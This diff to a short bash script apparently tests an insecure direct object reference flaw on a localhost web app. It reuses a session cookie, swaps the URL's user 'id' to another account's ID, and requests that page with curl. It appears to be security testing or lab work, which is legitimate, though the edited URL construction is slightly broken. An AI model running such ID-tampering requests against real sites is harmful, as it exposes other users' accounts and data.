@@ -11,13 +11,13 @@ if [ -z "$PHPSESSID" ] || [ -z "$USER_ID" ]; then
 fi
 
 # A changer
-BASE_URL="http://127.0.0.1/pages/user/send_email.php"
+BASE_URL="http://localhost:2024/pages/user/user_page.php?"
 
 # Construire l'URL initiale avec USER_ID
 INITIAL_URL="$BASE_URL?id=$USER_ID"
 
 # Modifier le paramètre `id` dans l'URL (exemple : id=1 -> id=2)
-MODIFIED_URL=$(echo "$INITIAL_URL" | sed 's/id=[0-9]\+/id=2/')
+MODIFIED_URL=$(echo "$INITIAL_URL" | sed 's/id=[0-9]\+/id=3/')
 
 echo "Initial URL: $INITIAL_URL"
 echo "Modified URL: $MODIFIED_URL"
@@ -31,6 +31,10 @@ response=$(curl -i -L -X POST "$MODIFIED_URL" \
 echo "----------------------------------------"
 if echo "$response" | grep -q "200 OK"; then
     echo "URL modified"
+    sed -i '2s/.*/3/' session_info.txt
+
+echo "----------------------------------------"
+    curl "$MODIFIED_URL"
 else
     echo "Failed to modified URL."
 fi
